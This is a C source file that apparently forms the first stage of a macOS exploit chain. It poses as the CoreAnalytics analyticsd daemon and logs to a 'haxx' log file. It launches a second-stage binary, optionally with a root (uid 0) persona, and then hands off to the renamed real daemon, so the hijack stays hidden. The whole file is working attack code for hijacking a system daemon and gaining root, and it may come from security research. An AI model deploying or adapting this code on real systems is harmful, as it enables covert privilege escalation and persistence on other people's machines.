#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <spawn.h>
#include <string.h>

#define REAL "/System/Library/PrivateFrameworks/CoreAnalytics.framework/Support/analyticsd.back"
#define POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE 1
#define STAGE_TWO "/usr/local/bin/haxx"
#define LOG_FILE "/private/var/haxx/haxx.log"

int posix_spawnattr_set_persona_np(const posix_spawnattr_t* __restrict, uid_t, uint32_t);
int posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t* __restrict, uid_t);
int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t* __restrict, uid_t);

char* argv_stage2[] = {STAGE_TWO, NULL};
char* argv_real[] = {REAL, NULL};
char* envp[] = {NULL};

int main (int __unused argc, char* argv[]) {
  umask(0000);
  FILE* fptr = fopen(LOG_FILE,"a");
  if (fptr == NULL) {
    fprintf(stderr, "stage1: Unable to open %s, errno = %d\n", LOG_FILE,  errno);
    exit(1);
  }
  time_t raw_time;
  struct tm* timeinfo;
  time(&raw_time);
  timeinfo = localtime(&raw_time);
  fprintf(fptr,"%s: stage1: haxx stage 1 running!: uid = %d\n", asctime(timeinfo), getuid());
  posix_spawnattr_t attr;
  posix_spawnattr_init(&attr);
#ifdef HAXX_SETUID
  posix_spawnattr_set_persona_np(&attr, /*persona_id=*/99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
  posix_spawnattr_set_persona_uid_np(&attr, 0);
#endif
  fprintf(fptr,"%s: stage1: Trying to spawn haxx stage 2...\n", asctime(timeinfo));
  int pid = 0;
  int ret = posix_spawnp(&pid, STAGE_TWO, NULL, &attr, argv_stage2, envp);
  if (ret) {
    fprintf(fptr, "%s: stage1: Unable to spawn stage2 %s: %s", asctime(timeinfo), STAGE_TWO, strerror(errno));
  }
  fprintf(fptr, "%s: stage1: executing %s, bye\n", asctime(timeinfo), REAL);
  fclose(fptr);
  execve(REAL, argv_real, envp);
  FILE* fptr_fail = fopen(LOG_FILE,"a");
  fprintf(fptr_fail, "%s: stage1: unable to execute %s: %s\n", asctime(timeinfo), REAL, strerror(errno));
  fclose(fptr_fail);
  exit(2);
}
